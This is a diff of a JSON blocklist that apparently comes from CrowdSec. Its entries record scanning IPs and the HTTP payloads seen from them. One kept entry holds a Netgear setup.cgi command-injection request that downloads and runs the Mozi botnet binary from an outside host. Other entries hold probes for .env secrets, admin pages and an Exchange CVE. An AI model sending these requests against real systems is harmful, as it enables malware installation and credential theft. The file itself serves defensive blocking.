@@ -1,10 +1,10 @@
 {
-  "generated_at": "2026-10-28T13:00:00Z",
+  "generated_at": "2026-10-29T01:00:00Z",
   "ttl_days": 7,
   "scope": "crowdsec",
   "counts": {
-    "total": 43,
-    "v4": 43,
+    "total": 45,
+    "v4": 45,
     "v6": 0
   },
   "items": [
@@ -50,91 +50,6 @@
       "payloads": [
         "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*&wget+http://137.59.218.84:60339/Mozi.m+-O+/tmp/netgear&sh+netgear&curpath=/&currentsetting.htm=1",
         "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://137.59.218.84:60339/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1"
-      ]
-    },
-    {
-      "ip": "130.89.144.165",
-      "family": "v4",
-      "first_seen": "2026-10-21T22:00:00Z",
-      "last_seen": "2026-10-21T22:00:00Z",
-      "scenarios": [
-        "crowdsec/http-bad-user-agent"
-      ],
-      "sources": [
-        "crowdsec"
-      ],
-      "asn": "1133",
-      "asn_name": "UTWENTE-AS SURF B.V.",
-      "asn_prefix": "130.89.0.0/16",
-      "payloads": [
-        "GET /robots.txt",
-        "GET /"
-      ]
-    },
-    {
-      "ip": "34.84.158.86",
-      "family": "v4",
-      "first_seen": "2026-10-21T16:00:00Z",
-      "last_seen": "2026-10-21T16:00:00Z",
-      "scenarios": [
-        "crowdsec/http-bad-user-agent",
-        "crowdsec/http-crawl-non_statics",
-        "crowdsec/http-dos-swithcing-ua",
-        "crowdsec/http-path-traversal-probing",
-        "crowdsec/http-probing",
-        "crowdsec/http-sensitive-files"
-      ],
-      "sources": [
-        "crowdsec"
-      ],
-      "asn": "396982",
-      "asn_name": "GOOGLE-CLOUD-PLATFORM - Google LLC",
-      "asn_prefix": "34.84.144.0/20",
-      "tags": [
-        "mwl:cloud=\"gcp\""
-      ],
-      "payloads": [
-        "GET /@fs/.env?import&?raw??",
-        "GET /@fs/app/.env.production?import&raw??",
-        "GET /@fs/src/.env?import&raw??",
-        "GET /.env.production.local",
-        "GET /.env.development.local",
-        "GET /.envrc",
-        "GET /.env.config",
-        "GET /",
-        "GET /robots.txt",
-        "POST /",
-        "GET /fkx9pv5mcnrmla4e503u",
-        "GET /z9x8c7v6b5-debug-trigger-salledarcade.fr",
-        "POST /_next",
-        "GET /vercel.json",
-        "GET /.env.keys",
-        "GET /netlify.toml",
-        "GET /supabase/config.toml",
-        "GET /2p0nklogg2711vsqlidk",
-        "POST /graphql",
-        "GET /.env.supabase"
-      ]
-    },
-    {
-      "ip": "167.172.89.239",
-      "family": "v4",
-      "first_seen": "2026-10-21T16:00:00Z",
-      "last_seen": "2026-10-21T16:00:00Z",
-      "scenarios": [
-        "crowdsec/http-bad-user-agent"
-      ],
-      "sources": [
-        "crowdsec"
-      ],
-      "asn": "14061",
-      "asn_name": "DIGITALOCEAN-ASN - DigitalOcean",
-      "asn_prefix": "167.172.80.0/20",
-      "payloads": [
-        "GET /wp-content/plugins/plugins/cache.php",
-        "GET /assets/images/images/cache.php",
-        "GET /images/images/cache.php",
-        "GET /cgi-bin/cgi-bin/cgi-bin/cgi-bin/cache.php"
       ]
     },
     {
@@ -1139,6 +1054,119 @@
       "asn_prefix": "184.104.0.0/15",
       "payloads": [
         "GET /remote/logincheck"
+      ]
+    },
+    {
+      "ip": "66.132.186.188",
+      "family": "v4",
+      "first_seen": "2026-10-28T17:00:00Z",
+      "last_seen": "2026-10-28T17:00:00Z",
+      "scenarios": [
+        "crowdsec/http-bad-user-agent"
+      ],
+      "sources": [
+        "crowdsec"
+      ],
+      "asn": "398324",
+      "asn_name": "CENSYS-ARIN-01 - Censys, Inc.",
+      "asn_prefix": "66.132.186.0/24",
+      "payloads": [
+        "GET /",
+        "GET /debug/pprof/"
+      ]
+    },
+    {
+      "ip": "20.46.254.238",
+      "family": "v4",
+      "first_seen": "2026-10-28T16:00:00Z",
+      "last_seen": "2026-10-28T16:00:00Z",
+      "scenarios": [
+        "crowdsec/CVE-2022-41082"
+      ],
+      "sources": [
+        "crowdsec"
+      ],
+      "asn": "8075",
+      "asn_name": "MICROSOFT-CORP-MSN-AS-BLOCK - Microsoft Corporation",
+      "asn_prefix": "20.40.0.0/13",
+      "tags": [
+        "mwl:cloud=\"azure\""
+      ],
+      "payloads": [
+        "GET /autodiscover/autodiscover.json?@zdi/Powershell"
+      ]
+    },
+    {
+      "ip": "66.132.159.141",
+      "family": "v4",
+      "first_seen": "2026-10-28T15:00:00Z",
+      "last_seen": "2026-10-28T15:00:00Z",
+      "scenarios": [
+        "crowdsec/http-bad-user-agent"
+      ],
+      "sources": [
+        "crowdsec"
+      ],
+      "asn": "398324",
+      "asn_name": "CENSYS-ARIN-01 - Censys, Inc.",
+      "asn_prefix": "66.132.159.0/24",
+      "tags": [
+        "mwl:scanner=\"censys\""
+      ],
+      "payloads": [
+        "GET /"
+      ]
+    },
+    {
+      "ip": "216.180.246.238",
+      "family": "v4",
+      "first_seen": "2026-10-28T14:00:00Z",
+      "last_seen": "2026-10-28T14:00:00Z",
+      "scenarios": [
+        "crowdsec/http-admin-interface-probing",
+        "crowdsec/http-probing",
+        "crowdsec/http-technology-probing"
+      ],
+      "sources": [
+        "crowdsec"
+      ],
+      "asn": "396982",
+      "asn_name": "GOOGLE-CLOUD-PLATFORM - Google LLC",
+      "asn_prefix": "216.180.246.0/24",
+      "payloads": [
+        "GET /admin/index.html",
+        "GET /+CSCOE+/logon.html",
+        "GET /remote/login",
+        "GET /",
+        "GET /manage/account/login",
+        "GET /index.html",
+        "GET /cgi-bin/login.cgi",
+        "GET /login.htm",
+        "GET /login.html",
+        "GET /login.jsp",
+        "GET /login",
+        "GET /doc/index.html"
+      ]
+    },
+    {
+      "ip": "4.227.154.22",
+      "family": "v4",
+      "first_seen": "2026-10-28T13:00:00Z",
+      "last_seen": "2026-10-28T13:00:00Z",
+      "scenarios": [
+        "crowdsec/http-technology-probing"
+      ],
+      "sources": [
+        "crowdsec"
+      ],
+      "asn": "8075",
+      "asn_name": "MICROSOFT-CORP-MSN-AS-BLOCK - Microsoft Corporation",
+      "asn_prefix": "4.224.0.0/12",
+      "tags": [
+        "mwl:cloud=\"azure\""
+      ],
+      "payloads": [
+        "GET /owa/auth/x.js"
       ]
     }
   ]
